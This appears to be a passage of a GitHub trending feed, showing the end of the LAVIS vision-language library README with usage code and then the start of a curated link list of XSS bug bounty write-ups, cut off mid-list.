salesforce-lavis&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;Or, for development, you may build from source&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/salesforce/LAVIS.git&#xA;cd LAVIS&#xA;pip install -e .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;h3&gt;Model Zoo&lt;/h3&gt; &#xA;&lt;p&gt;Model zoo summarizes supported models in LAVIS, to view:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from lavis.models import model_zoo&#xA;print(model_zoo)&#xA;# ==================================================&#xA;# Architectures                  Types&#xA;# ==================================================&#xA;# albef_classification           ve&#xA;# albef_feature_extractor        base&#xA;# albef_nlvr                     nlvr&#xA;# albef_pretrain                 base&#xA;# albef_retrieval                coco, flickr&#xA;# albef_vqa                      vqav2&#xA;# alpro_qa                       msrvtt, msvd&#xA;# alpro_retrieval                msrvtt, didemo&#xA;# blip_caption                   base_coco, large_coco&#xA;# blip_classification            base&#xA;# blip_feature_extractor         base&#xA;# blip_nlvr                      nlvr&#xA;# blip_pretrain                  base&#xA;# blip_retrieval                 coco, flickr&#xA;# blip_vqa                       vqav2, okvqa, aokvqa&#xA;# clip_feature_extractor         ViT-B-32, ViT-B-16, ViT-L-14, ViT-L-14-336, RN50&#xA;# clip                           ViT-B-32, ViT-B-16, ViT-L-14, ViT-L-14-336, RN50&#xA;# gpt_dialogue                   base&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Let’s see how to use models in LAVIS to perform inference on example data. We first load a sample image from local.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch&#xA;from PIL import Image&#xA;# setup device to use&#xA;device = torch.device(&#34;cuda&#34; if torch.cuda.is_available() else &#34;cpu&#34;)&#xA;# load sample image&#xA;raw_image = Image.open(&#34;docs/_static/merlion.png&#34;).convert(&#34;RGB&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This example image shows &lt;a href=&#34;https://en.wikipedia.org/wiki/Merlion&#34;&gt;Merlion park&lt;/a&gt; (&lt;a href=&#34;https://theculturetrip.com/asia/singapore/articles/what-exactly-is-singapores-merlion-anyway/&#34;&gt;source&lt;/a&gt;), a landmark in Singapore.&lt;/p&gt; &#xA;&lt;h3&gt;Image Captioning&lt;/h3&gt; &#xA;&lt;p&gt;In this example, we use the BLIP model to generate a caption for the image. To make inference even easier, we also associate each pre-trained model with its preprocessors (transforms), accessed via &lt;code&gt;load_model_and_preprocess()&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch&#xA;from lavis.models import load_model_and_preprocess&#xA;device = torch.device(&#34;cuda&#34; if torch.cuda.is_available() else &#34;cpu&#34;)&#xA;# loads BLIP caption base model, with finetuned checkpoints on MSCOCO captioning dataset.&#xA;# this also loads the associated image processors&#xA;model, vis_processors, _ = load_model_and_preprocess(name=&#34;blip_caption&#34;, model_type=&#34;base_coco&#34;, is_eval=True, device=device)&#xA;# preprocess the image&#xA;# vis_processors stores image transforms for &#34;train&#34; and &#34;eval&#34; (validation / testing / inference)&#xA;image = vis_processors[&#34;eval&#34;](raw_image).unsqueeze(0).to(device)&#xA;# generate caption&#xA;model.generate({&#34;image&#34;: image})&#xA;# [&#39;a large fountain spewing water into the air&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Visual question answering (VQA)&lt;/h3&gt; &#xA;&lt;p&gt;BLIP model is able to answer free-form questions about images in natural language. To access the VQA model, simply replace the &lt;code&gt;name&lt;/code&gt; and &lt;code&gt;model_type&lt;/code&gt; arguments passed to &lt;code&gt;load_model_and_preprocess()&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from lavis.models import load_model_and_preprocess&#xA;model, vis_processors, txt_processors = load_model_and_preprocess(name=&#34;blip_vqa&#34;, model_type=&#34;vqav2&#34;, is_eval=True, device=device)&#xA;# ask a random question.&#xA;question = &#34;Which city is this photo taken?&#34;&#xA;image = vis_processors[&#34;eval&#34;](raw_image).unsqueeze(0).to(device)&#xA;question = txt_processors[&#34;eval&#34;](question)&#xA;model.predict_answers(samples={&#34;image&#34;: image, &#34;text_input&#34;: question}, inference_method=&#34;generate&#34;)&#xA;# [&#39;singapore&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Unified Feature Extraction Interface&lt;/h3&gt; &#xA;&lt;p&gt;LAVIS provides a unified interface to extract features from each architecture. To extract features, we load the feature extractor variants of each model. The multimodal feature can be used for multimodal classification. The low-dimensional unimodal features can be used to compute cross-modal similarity.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from lavis.models import load_model_and_preprocess&#xA;model, vis_processors, txt_processors = load_model_and_preprocess(name=&#34;blip_feature_extractor&#34;, model_type=&#34;base&#34;, is_eval=True, device=device)&#xA;caption = &#34;a large fountain spewing water into the air&#34;&#xA;image = vis_processors[&#34;eval&#34;](raw_image).unsqueeze(0).to(device)&#xA;text_input = txt_processors[&#34;eval&#34;](caption)&#xA;sample = {&#34;image&#34;: image, &#34;text_input&#34;: [text_input]}&#xA;&#xA;features_multimodal = model.extract_features(sample)&#xA;print(features_multimodal.multimodal_embeds.shape)&#xA;# torch.Size([1, 12, 768]), use features_multimodal[:,0,:] for multimodal classification tasks&#xA;&#xA;features_image = model.extract_features(sample, mode=&#34;image&#34;)&#xA;features_text = model.extract_features(sample, mode=&#34;text&#34;)&#xA;print(features_image.image_embeds.shape)&#xA;# torch.Size([1, 197, 768])&#xA;print(features_text.text_embeds.shape)&#xA;# torch.Size([1, 12, 768])&#xA;&#xA;# low-dimensional projected features&#xA;print(features_image.image_embeds_proj.shape)&#xA;# torch.Size([1, 197, 256])&#xA;print(features_text.text_embeds_proj.shape)&#xA;# torch.Size([1, 12, 256])&#xA;similarity = features_image.image_embeds_proj[:,0,:] @ features_text.text_embeds_proj[:,0,:].t()&#xA;print(similarity)&#xA;# tensor([[0.2622]])&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Load Datasets&lt;/h3&gt; &#xA;&lt;p&gt;LAVIS inherently supports a wide variety of common language-vision datasets by providing &lt;a href=&#34;https://opensource.salesforce.com/LAVIS//latest/benchmark&#34;&gt;automatic download tools&lt;/a&gt; to help download and organize these datasets. After downloading, to load the datasets, use the following code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from lavis.datasets.builders import dataset_zoo&#xA;dataset_names = dataset_zoo.get_names()&#xA;print(dataset_names)&#xA;# [&#39;aok_vqa&#39;, &#39;coco_caption&#39;, &#39;coco_retrieval&#39;, &#39;coco_vqa&#39;, &#39;conceptual_caption_12m&#39;,&#xA;#  &#39;conceptual_caption_3m&#39;, &#39;didemo_retrieval&#39;, &#39;flickr30k&#39;, &#39;imagenet&#39;, &#39;laion2B_multi&#39;,&#xA;#  &#39;msrvtt_caption&#39;, &#39;msrvtt_qa&#39;, &#39;msrvtt_retrieval&#39;, &#39;msvd_caption&#39;, &#39;msvd_qa&#39;, &#39;nlvr&#39;,&#xA;#  &#39;nocaps&#39;, &#39;ok_vqa&#39;, &#39;sbu_caption&#39;, &#39;snli_ve&#39;, &#39;vatex_caption&#39;, &#39;vg_caption&#39;, &#39;vg_vqa&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After downloading the images, we can use &lt;code&gt;load_dataset()&lt;/code&gt; to obtain the dataset.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from lavis.datasets.builders import load_dataset&#xA;coco_dataset = load_dataset(&#34;coco_caption&#34;)&#xA;print(coco_dataset.keys())&#xA;# dict_keys([&#39;train&#39;, &#39;val&#39;, &#39;test&#39;])&#xA;print(len(coco_dataset[&#34;train&#34;]))&#xA;# 566747&#xA;print(coco_dataset[&#34;train&#34;][0])&#xA;# {&#39;image&#39;: &amp;lt;PIL.Image.Image image mode=RGB size=640x480&amp;gt;,&#xA;#  &#39;text_input&#39;: &#39;A woman wearing a net on her head cutting a cake. &#39;,&#xA;#  &#39;image_id&#39;: 0}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you already host a local copy of the dataset, you can pass in the &lt;code&gt;vis_path&lt;/code&gt; argument to change the default location to load images.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;coco_dataset = load_dataset(&#34;coco_caption&#34;, vis_path=YOUR_LOCAL_PATH)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Jupyter Notebook Examples&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/salesforce/LAVIS/tree/main/examples&#34;&gt;examples&lt;/a&gt; for more inference examples, e.g. captioning, feature extraction, VQA, GradCam, zeros-shot classification.&lt;/p&gt; &#xA;&lt;h2&gt;Resources and Tools&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Benchmarks&lt;/strong&gt;: see &lt;a href=&#34;https://opensource.salesforce.com/LAVIS//latest/benchmark&#34;&gt;Benchmark&lt;/a&gt; for instructions to evaluate and train supported models.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Dataset Download and Browsing&lt;/strong&gt;: see &lt;a href=&#34;https://opensource.salesforce.com/LAVIS//latest/benchmark&#34;&gt;Dataset Download&lt;/a&gt; for instructions and automatic tools on download common language-vision datasets.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;GUI Demo&lt;/strong&gt;: to run the demo locally, run &lt;code&gt;bash run_scripts/run_demo.sh&lt;/code&gt; and then follow the instruction on the prompts to view in browser. A web demo is coming soon.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Documentations&lt;/h2&gt; &#xA;&lt;p&gt;For more details and advanced usages, please refer to &lt;a href=&#34;https://opensource.salesforce.com/LAVIS//latest/index.html#&#34;&gt;documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Ethical and Responsible Use&lt;/h2&gt; &#xA;&lt;p&gt;We note that models in LAVIS provide no guarantees on their multimodal abilities; incorrect or biased predictions may be observed. In particular, the datasets and pretrained models utilized in LAVIS may contain socioeconomic biases which could result in misclassification and other unwanted behaviors such as offensive or inappropriate speech. We strongly recommend that users review the pre-trained models and overall system in LAVIS before practical adoption. We plan to improve the library by investigating and mitigating these potential biases and inappropriate behaviors in the future.&lt;/p&gt; &#xA;&lt;h2&gt;Technical Report and Citing LAVIS&lt;/h2&gt; &#xA;&lt;p&gt;You can find more details in our &lt;a href=&#34;https://arxiv.org/abs/2209.09019&#34;&gt;technical report&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you&#39;re using LAVIS in your research or applications, please cite using this BibTeX:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@misc{li2022lavis,&#xA;      title={LAVIS: A Library for Language-Vision Intelligence}, &#xA;      author={Dongxu Li and Junnan Li and Hung Le and Guangsen Wang and Silvio Savarese and Steven C. H. Hoi},&#xA;      year={2022},&#xA;      eprint={2209.09019},&#xA;      archivePrefix={arXiv},&#xA;      primaryClass={cs.CV}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Contact us&lt;/h2&gt; &#xA;&lt;p&gt;If you have any questions, comments or suggestions, please do not hesitate to contact us at &lt;a href=&#34;mailto:lavis@salesforce.com&#34;&gt;lavis@salesforce.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/LICENSE.txt&#34;&gt;BSD 3-Clause License&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>devanshbatham/Awesome-Bugbounty-Writeups</title>
    <updated>2023-02-03T01:44:21Z</updated>
    <id>tag:github.com,2023-02-03:/devanshbatham/Awesome-Bugbounty-Writeups</id>
    <link href="https://github.com/devanshbatham/Awesome-Bugbounty-Writeups" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#cross-site-scripting-xss&#34;&gt;Cross Site Scripting (XSS)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#cross-site-request-forgery-csrf&#34;&gt;Cross Site Request Forgery (CSRF)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#clickjacking-ui-redressing-attack&#34;&gt;Clickjacking (UI Redressing Attack)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#local-file-inclusion-lfi&#34;&gt;Local File Inclusion (LFI)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#subdomain-takeover&#34;&gt;Subdomain Takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#denial-of-service-dos&#34;&gt;Denial of Service (DOS)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#authentication-bypass&#34;&gt;Authentication Bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#sql-injectionsqli&#34;&gt;SQL injection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#insecure-direct-object-reference-idor&#34;&gt;Insecure Direct Object Reference (IDOR)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#2fa-related-issues&#34;&gt;2FA Related issues&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#cors-related-issues&#34;&gt;CORS Related issues&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups/raw/master/README.md#server-side-request-forgery-ssrf&#34;&gt;Server Side Request Forgery (SSRF)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups/raw/master/README.md#race-condition&#34;&gt;Race Condition&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#remote-code-execution-rce&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#android-pentesting&#34;&gt;Android Pentesting&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#maintainers&#34;&gt;Maintainers&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Cross Site Scripting (XSS)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mohameddaher/from-p5-to-p5-to-p2-from-nothing-to-1000-bxss-4dd26bc30a82&#34;&gt;From P5 to P2 to 100 BXSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4&#34;&gt;Google Acquisition XSS (Apigee)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.missoumsai.com/google-accounts-xss.html&#34;&gt;DOM-Based XSS at accounts.google.com by Google Voice Extension&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8&#34;&gt;XSS on Microsoft.com via Angular Js template injection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html&#34;&gt;Researching Polymorphic Images for XSS on Google Scholar&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@kristian.balog/netflix-party-simple-xss-ec92ed1d7e18&#34;&gt;Netflix Party Simple XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/stored-xss-in-google-nest-a82373bbda68&#34;&gt;Stored XSS in google nest&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nnez/always-escalate-from-self-xss-to-persistent-xss-on-login-portal-54265b0adfd0&#34;&gt;Self XSS to persistent XSS on login portal&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://0x65.dev/blog/2020-03-30/cve-2019-17004-semi-universal-xss-affecting-firefox-for-ios.html&#34;&gt;Universal XSS affecting Firefox &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/xss-waf-character-limitation-bypass-like-a-boss-2c788647c229&#34;&gt;XSS WAF Character limitation bypass like a boss&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ch3ckm4te/self-xss-to-account-takeover-72c89775cf8f&#34;&gt;Self XSS to Account Takeover &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/reflected-xss-on-microsoft-com-subdomains-4bdfc2c716df&#34;&gt;Reflected XSS on Microsoft subdomains &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://smaranchand.com.np/2020/02/the-tricky-xss/&#34;&gt;The tricky XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@godofdarkness.msf/reflected-xss-in-at-t-7f1bdd10d8f7&#34;&gt;Reflected XSS in AT&amp;amp;T&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/&#34;&gt;XSS on Google using Acunetix &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa&#34;&gt;Exploiting websocket application wide XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hazana.xyz/posts/escalating-reflected-xss-with-http-smuggling/&#34;&gt;Reflected XSS with HTTP Smuggling &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.amolbaikar.com/xss-on-facebook-instagram-cdn-server-bypassing-signature-protection/&#34;&gt;XSS on Facebook instagram CDN server bypassing signature protection &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.amolbaikar.com/xss-on-facebooks-acquisition-oculus-cdn-server/&#34;&gt;XSS on Facebook&#39;s Acquisition Oculus&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@gguzelkokar.mdbf15/xss-on-sony-subdomain-feddaea8f5ac&#34;&gt;XSS on sony Subdomain &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://footstep.ninja/posts/exploiting-self-xss/&#34;&gt;Exploiting Self XSS &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a&#34;&gt;Effortlessly Finding Cross Site Scripting inclusion XSSI &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jinone.github.io/bugbounty-a-dom-xss/&#34;&gt;Bugbounty a DOM XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678?&#34;&gt;Blind XSS : a mind Game &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://payatu.com/blog/nikhil-mittal/firefox-ios-qr-code-reader-xss-(cve-2019-17003)&#34;&gt;FireFox IOS QR code reader XSS(CVE-2019-17003)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://evanricafort.blogspot.com/2019/12/html-injection-to-xss-bypass-in.html&#34;&gt;HTML injection to XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hackerone.com/reports/881918&#34;&gt;CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@navne3t/150-xss-at-error-page-of-respository-code-4fc628892742&#34;&gt;XSS at error page of repository code &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hackerinside.me/2019/12/xss-like-pro.html&#34;&gt;XSS like a Pro&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@abhishake100/how-i-turned-self-xss-to-stored-via-csrf-d12eaaf59f2e&#34;&gt;How I turned self XSS to stored XSS via CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@elmrhassel/xss-stored-on-outlook-web-outlook-android-app-ad4bd46b8823&#34;&gt;XSS Stored on Outlook web&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mohameddaher/how-i-paid-2-for-1054-xss-bug-20-chars-blind-xss-payloads-12d32760897b&#34;&gt;XSS Bug 20 Chars Blind XSS Payload&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://research.securitum.com/xss-in-amp4email-dom-clobbering/&#34;&gt;XSS in AMP4EMAIL(DOM clobbering)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hacknpentest.com/dom-based-xss-bug-bounty-writeup/&#34;&gt;DOM Based XSS bug bounty writeup&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@04sabsas/xss-will-never-die-eb3584081a5f&#34;&gt;XSS will never die &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968&#34;&gt;5000 USD XSS issue at avast desktop antivirus&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://noobe.io/articles/2019-10/xss-to-account-takeover&#34;&gt;XSS to account takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@pflash0x0punk/how-paypal-helped-me-to-generate-xss-9408c0931add&#34;&gt;How Paypal helped me to generate XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce&#34;&gt;Bypass Uppercase filters like a PRO(XSS advanced methods)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mehulcodes/stealing-login-credentials-with-reflected-xss-7cb450bf5710&#34;&gt;Stealing login credentials with reflected XSS &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://victoni.github.io/bug-hunting-xss-on-cookie-popup-warning/&#34;&gt;bughunting xss on cookie popup warning &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nirmaldahal.com.np/xss-is-love/&#34;&gt;XSS is love&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@tech96bot/oneplus-xss-vulnerability-in-customer-support-portal-d5887a7367f4&#34;&gt;Oneplus XSS vulnerability in customer support portal&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://noobe.io/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce&#34;&gt;Exploiting cookie based XSS by finding RCE &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@hariharan21/stored-xss-on-zendesk-via-macros-part-2-676cefee4616&#34;&gt;Stored XSS on zendesk via macros &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hackerinside.me/2019/09/xss-in-zoho-mail.html&#34;&gt;XSS in ZOHO main&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2019/09/dom-based-xss-in-private-program.html&#34;&gt;DOM based XSS in private program&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@04sabsas/bugbounty-writeup-take-attention-and-get-stored-xss-495dd6eab07e&#34;&gt;Bugbounty writeup : Take Attention and get stored XSSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gauravnarwani.com/how-i-xssed-admin-account/&#34;&gt;How I xssed admin account &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://websecblog.com/vulns/clickjacking-xss-on-google-org/&#34;&gt;Clickjacking XSS on google &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://learn.hackersid.com/2019/08/stored-xss-on-laporbugid.html&#34;&gt;Stored XSS on laporbugid&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.shawarkhan.com/2019/08/leveraging-angularjs-based-xss-to-privilege-escalation.html&#34;&gt;Leveraging angularjs based XSS to privilege escalation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.usejournal.com/how-i-found-xss-by-searching-in-shodan-6943b799e648&#34;&gt;How I found XSS by searching in shodan&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nahoragg/chaining-cache-poisoning-to-stored-xss-b910076bda4f&#34;&gt;Chaining caache poisining to stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@hungrybytes/xss-to-rce-in-e20b2bc55f94&#34;&gt;XSS to RCE &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@bywalks/xss-on-twitter-worth-1120-914dcd28ee18&#34;&gt;XSS on twitter worth 1120&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@madguyyy/reflected-xss-in-ebay-com-60a9d61e26cd&#34;&gt;Reflected XSS in ebay.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@iSecMax/%D1%81ookie-based-xss-exploitation-2300-bug-bounty-story-9bc532ffa564&#34;&gt;Cookie based XSS exolpoitation 2300 bug bounty &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/what-do-netcat-smtp-and-self-xss-have-in-common-stored-xss-a05648b72002&#34;&gt;What do netcat -SMTP-self XSS have in common &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://thesecurityexperts.wordpress.com/2019/07/11/xss-on-google-custom-search-engine/&#34;&gt;XSS on google custom search engine &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nandwanajatin25/story-of-a-stored-xss-to-full-account-takeover-vulnerability-n-a-to-accepted-8478aa5e0d8e&#34;&gt;Story of a Full Account Takeover vulnerability N/A to Accepted &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@schopath/yeah-i-got-p2-in-1-minute-stored-xss-via-markdown-editor-7872dba3f158&#34;&gt;Yeah I got p2 in 1 minute stored XSS via markdown editor 